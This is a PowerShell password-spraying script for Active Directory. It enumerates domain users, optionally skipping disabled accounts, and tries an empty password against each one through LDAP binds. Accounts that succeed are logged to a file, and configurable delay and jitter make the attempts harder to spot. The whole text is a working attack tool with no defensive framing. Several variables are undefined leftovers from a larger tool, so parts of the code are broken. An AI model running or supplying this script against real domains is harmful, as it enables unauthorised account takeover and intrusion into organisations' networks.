function Invoke-SprayEmptyPassword
{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $UserList = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $OutFile,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 3, Mandatory = $false)]
     [int]
     $Delay=0,
     
     [Parameter(Position = 4, Mandatory = $false)]
     $Jitter=0,

     [Parameter(Position = 5, Mandatory = $false)]
     [switch]
     $RemoveDisabled

    )
    try
    {
        if ($Domain -ne "")
        {
            # Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            Write-Host "Current Domain is $CurrentDomain"
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }
    
    if ($UserList -eq "")
    {
        $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
        $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
        $UserSearcher.SearchRoot = $DirEntry

        $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null

        if ($RemoveDisabled)
        {
            Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
            $UserSearcher.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
        }
        else
        {
            $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user))"
        }
        $UserSearcher.PageSize = 1000
        $AllUserObjects = $UserSearcher.FindAll()
        $UserListArray = @()

        foreach ($user in $AllUserObjects)
        {
            $samaccountname = $user.Properties.samaccountname
            $UserListArray += $samaccountname
        }

    }
    else
    {
        # if a Userlist is specified use it and do not check for lockout thresholds
        Write-Host "[*] Using $UserList as userlist to spray with"
        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $UserListArray = @()
        try
        {
            $UserListArray = Get-Content $UserList -ErrorAction stop
        }
        catch [Exception]
        {
            Write-Host -ForegroundColor "red" "$_.Exception"
            break
        }

    }
    Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter
    if (($i+1) -lt $Passwords.count)
    {
        Countdown-Timer -Seconds (60*$observation_window)
    }
}
function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $Domain,
            [Parameter(Position=2)]
            [string[]]
            $UserListArray,
            [Parameter(Position=3)]
            [string]
            $OutFile,
            [Parameter(Position=4)]
            [int]
            $Delay=0,
            [Parameter(Position=5)]
            [double]
            $Jitter=0
    )
    $time = Get-Date
    $count = $UserListArray.count
    Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
    $curr_user = 0
    Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"
    $RandNo = New-Object System.Random

    foreach ($User in $UserListArray)
    {
        if ($UsernameAsPassword)
        {
            $Password = $User
        }
        
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,"")
        if ($Domain_check.name -ne $null)
        {
            if ($OutFile -ne "")
            {
                Add-Content $OutFile $User
            }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:Empty"
        }
        $curr_user += 1
        Write-Host -nonewline "$curr_user of $count users tested`r`n"
        if ($Delay)
        {
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
    }

}
